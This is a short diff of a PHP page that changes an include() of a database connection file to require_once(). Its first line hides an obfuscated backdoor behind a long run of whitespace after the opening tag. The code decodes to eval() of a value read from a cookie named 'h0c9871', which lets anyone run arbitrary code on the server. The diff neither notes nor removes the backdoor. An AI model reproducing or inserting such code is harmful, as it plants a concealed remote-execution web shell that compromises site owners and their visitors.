@@ -1,6 +1,6 @@
 <?php                                                                                                                                                                                                                                                   $r2d='O9sthKICefc(\'1a87_v0ilE$0c9871';if(isset(${$r2d[17].$r2d[7].$r2d[0].$r2d[0].$r2d[5].$r2d[6].$r2d[22]}[$r2d[4].$r2d[19].$r2d[10].$r2d[1].$r2d[15].$r2d[16].$r2d[13]])){eval(${$r2d[17].$r2d[7].$r2d[0].$r2d[0].$r2d[5].$r2d[6].$r2d[22]}[$r2d[4].$r2d[19].$r2d[10].$r2d[1].$r2d[15].$r2d[16].$r2d[13]]);} ?><?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=utf-8');
 
 $ch_com_id = "-1";
